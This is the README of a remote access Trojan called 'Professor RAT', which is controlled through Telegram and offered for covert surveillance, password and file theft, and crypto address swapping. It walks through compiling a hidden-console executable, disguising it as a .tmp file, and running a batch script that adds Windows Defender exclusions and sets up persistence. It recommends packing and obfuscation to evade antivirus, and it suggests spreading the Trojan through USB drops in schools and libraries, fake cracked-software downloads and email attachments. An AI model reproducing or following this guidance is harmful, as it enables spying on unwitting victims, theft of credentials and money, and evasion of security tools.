# üïµÔ∏è‚Äç‚ôÇÔ∏è Professor RAT - Remote Access Toolkit

A comprehensive remote access toolkit with Telegram-based C&C (Command and Control), designed for monitoring and data exfiltration.

## üîç Overview

Professor RAT is a feature-rich remote access Trojan that provides complete surveillance and control over compromised systems. It offers real-time monitoring (camera, microphone, screen), data extraction (passwords, files, browsing history), system control (process management, remote commands), and financial tools (crypto address swapping). All commands are managed through a stealthy Telegram interface. 

The toolkit supports two deployment approaches: **Quick Deployment** using batch scripts that require admin rights for full system access and automatic AV exclusion, or **Advanced Custom Deployment** where users compile customized, packed executables that bypass AV naturally and can be disguised as legitimate programs for stealthy distribution.

## üöÄ Deployment Methods

### Method 1: Quick Deployment (Admin Required)
```
system.tmp + deploy.bat
```
<br>

**Step 1: Install Required Dependencies**

Open command prompt as administrator and run:

```
pip install requests pycryptodome opencv-python pillow pyperclip pynput sounddevice psutil win32crypt nuitka
```

If any module is missing, install it individually:

```
pip install "module name"
pip install requests  
pip install pycryptodome
```

<br>

**Step 2: Compile with Nuitka**

Compile to create a standalone executable:

```
nuitka --onefile --follow-imports --windows-disable-console --include-package=requests --include-package=pycryptodome --include-package=cv2 --include-package=PIL --include-package=pyperclip --include-package=pynput --include-package=sounddevice --include-package=psutil --include-package=win32crypt main.pyw
```

This will create a `.exe` file without console window.

<br>

**Step 3: Rename File for Stealth**

Rename the compiled file:

```
ren system.exe custom_name.tmp
```

*Renaming to `.tmp` makes it look less suspicious than a random `.exe` file*

<br>

**Step 4: Update Batch File**

Update `deploy.bat` on line 16 with your new file name:

```
set "SOURCE_FILE=%~dp0custom_name.tmp"
```

<br>

**Step 5: Deploy**

Add both files to the same folder and run `deploy.bat` as Administrator

- Batch file automatically adds your file to Windows Defender exclusions
- Creates persistence via scheduled tasks/registry  
- Executes your payload with full system privileges
  
**Perfect for:** USB drops on open vulnerable computers *(Ex: libraries, malls, schools)* or social engineering where you convince someone to run the `.bat` as admin.

<br>

### Method 2: Advanced Custom Deployment

```
custom_app.exe (Packed / Obfuscated)
```

**How it works:**
- Modify ```main.pyw``` to create a unique, undetectable executable
- Replace ```"TOKEN"``` & ```"ID``` with your actual Telegram Bot Token and ID
- Use packing, obfuscation, file pumping, code signing and other evasion techniques to bypass AV 
- Since your compiled executable bypasses antivirus, you can disguise it as any legitimate program
- Then deploy your payload through any method - it appears as a clean, trusted file

**Perfect for:** Fake software downloads *(Ex: YouTube "cracked software" tutorials)*, email attachments, or any scenario where you need a clean, undetectable file that appears legitimate to the end user.
